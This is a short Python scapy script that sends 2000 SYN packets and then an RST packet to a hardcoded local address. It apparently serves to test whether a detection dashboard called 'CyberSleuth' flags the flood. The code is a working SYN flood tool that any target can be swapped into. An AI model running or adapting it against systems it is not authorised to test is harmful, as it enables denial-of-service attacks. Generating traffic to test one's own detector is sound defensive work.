from scapy.all import IP, TCP, send

# IMPORTANT: Use your actual local IP (e.g., 192.168.1.5)
TARGET_IP = "192.168.0.104" 
TARGET_PORT = 5000

print(f"🚀 Generating Anomalous SYN Flood against {TARGET_IP}:{TARGET_PORT}")

# 1. Send the SYN Flood
malicious_packet = IP(dst=TARGET_IP)/TCP(sport=4444, dport=TARGET_PORT, flags="S")
send(malicious_packet, count=2000, verbose=False)

print("💥 Attack finished. Sending RST packet to close the flow...")

# 2. Send the RST (Reset) packet to the exact same port
# This forces your backend to trigger the 5-second TCP_FIN_RST_TIMEOUT
rst_packet = IP(dst=TARGET_IP)/TCP(sport=4444, dport=TARGET_PORT, flags="R")
send(rst_packet, count=1, verbose=False)

print("⏳ Done! Check the CyberSleuth dashboard and wait 5 seconds...")